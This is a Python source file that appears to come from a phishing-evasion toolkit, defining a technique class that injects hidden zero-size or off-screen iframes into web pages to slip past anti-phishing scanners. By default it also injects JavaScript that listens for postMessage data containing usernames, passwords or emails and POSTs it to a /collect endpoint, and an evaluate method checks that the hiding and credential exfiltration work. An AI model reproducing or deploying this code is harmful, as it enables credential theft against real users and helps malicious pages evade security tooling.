from __future__ import annotations

from typing import Any, ClassVar

from app.techniques.base import (
    ApplyResult, BaseTechnique, Category, OptionSpec, Requirement, TechniqueGroup,
)
from app.utils.html_utils import parse_html, serialize_html
from app.utils.js_templates import HIDDEN_IFRAME_TEMPLATE


class HiddenIframeTechnique(BaseTechnique):
    """
    T14 — Hidden iframes + GhostFrame-like technique.

    Injects zero-size, off-screen iframes that load content invisibly.
    Many web scanners and anti-phishing tools skip iframes that have no
    visible size, missing their content entirely.
    """

    TECHNIQUE_ID: ClassVar[int] = 14
    TECHNIQUE_NAME: ClassVar[str] = "Hidden iframes / GhostFrame"
    GROUP: ClassVar[TechniqueGroup] = TechniqueGroup.HTML_DOM_JS
    CATEGORIES: ClassVar[list[Category]] = [Category.CREDENTIAL_THEFT, Category.MALWARE_DISTRIBUTION]
    REQUIREMENTS: ClassVar[list[Requirement]] = [Requirement.HAS_HTML]
    DESCRIPTION: ClassVar[str] = (
        "Injects hidden (zero-size / off-screen) iframes that load content "
        "invisibly. Anti-phishing scanners often skip iframes without visible "
        "dimensions, missing embedded malicious content."
    )
    OPTION_SPECS: ClassVar[list[OptionSpec]] = [
        OptionSpec(
            name="iframe_src",
            description="URL for the hidden iframe src (blank = derive /login on the same host)",
            type=str,
            default="",
        ),
        OptionSpec(
            name="iframe_count",
            description="Number of hidden iframes to inject",
            type=int,
            default=1,
            min_value=1,
            max_value=5,
        ),
        OptionSpec(
            name="hide_strategy",
            description="CSS hiding mechanism: 'offscreen' or 'clip_path'",
            type=str,
            default="clip_path",
        ),
        OptionSpec(
            name="listener_wired",
            description="Inject a postMessage listener that bubbles credentials up to /collect",
            type=bool,
            default=True,
        ),
    ]

    def apply(
        self,
        html: str,
        url: str,
        options: dict[str, Any],
        screenshot_bytes: bytes | None = None,
    ) -> ApplyResult:
        from urllib.parse import urljoin
        from app.utils.html_utils import safe_append_fragment

        iframe_src: str = options.get("iframe_src", "") or ""
        iframe_count: int = int(options.get("iframe_count", 1))
        hide_strategy: str = options.get("hide_strategy", "clip_path")
        listener_wired: bool = bool(options.get("listener_wired", True))

        if not iframe_src or iframe_src == "about:blank":
            iframe_src = urljoin(url, "/login")

        if hide_strategy == "clip_path":
            style = (
                "position:fixed;top:0;left:0;width:1px;height:1px;"
                "clip-path:inset(100%);opacity:0;border:0;pointer-events:none;"
            )
        else:
            style = (
                "position:absolute;left:-9999px;top:-9999px;"
                "width:1px;height:1px;opacity:0;border:0;"
            )

        soup = parse_html(html)
        appended = 0
        for i in range(iframe_count):
            iframe_html = (
                f'<iframe src="{iframe_src}" style="{style}" '
                f'tabindex="-1" aria-hidden="true" id="__ghost_frame_{i}__"></iframe>'
            )
            appended += safe_append_fragment(soup, iframe_html, target="body")

        if listener_wired:
            listener_js = """\
(function(){
  window.addEventListener('message', function(e){
    try{
      var d = e.data || {};
      if (d && (d.user || d.password || d.email)) {
        fetch('/collect', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(d),
          credentials: 'include',
          keepalive: true
        }).catch(function(){});
      }
    }catch(_){}
  }, false);
})();"""
            from app.utils.html_utils import inject_script_into_head
            inject_script_into_head(soup, listener_js)

        self.log("info", "iframe_applied",
                 src=iframe_src, count=appended,
                 hide=hide_strategy, listener=listener_wired)

        return ApplyResult(
            modified_html=serialize_html(soup),
            modified_url=None,
            extra_files={},
            change_log=[
                self._make_change(
                    "hidden_iframe_injected",
                    f"Injected {appended} hidden iframe(s) (src={iframe_src!r})",
                    details={
                        "src": iframe_src,
                        "count": appended,
                        "hide_strategy": hide_strategy,
                        "listener_wired": listener_wired,
                    },
                )
            ],
        )

    def evaluate(self, html, url, change_log, extra_files):
        from app.techniques.base import EvaluationResult
        signals, issues = [], []

        has_iframe = html and "<iframe" in html.lower()
        if has_iframe:
            signals.append("HTML has <iframe> element")
        else:
            issues.append("HTML missing <iframe> element")

        iframe_hidden = html and ("clip-path:inset" in html or "left:-9999px" in html)
        if iframe_hidden:
            signals.append("Iframe is hidden with clip-path or off-screen CSS")
        else:
            issues.append("Iframe may not be hidden")

        has_listener = html and "window.addEventListener('message'" in html
        if has_listener:
            signals.append("postMessage listener wired to exfiltrate credentials")
        else:
            issues.append("No postMessage listener found")

        entry = next((e for e in change_log if e.change_type == "hidden_iframe_injected"), None)
        if entry:
            count = entry.details.get("count", 0)
            if count >= 1:
                signals.append(f"change_log: {count} iframe(s) injected")
            else:
                issues.append("change_log shows 0 iframes injected")
        else:
            issues.append("No hidden_iframe_injected in change_log")

        passed = bool(has_iframe and iframe_hidden)
        return EvaluationResult(
            passed=passed,
            score=self._eval_score(signals, issues),
            signals=signals,
            issues=issues,
            details={"has_iframe": has_iframe, "iframe_hidden": iframe_hidden, "has_listener": has_listener},
        )
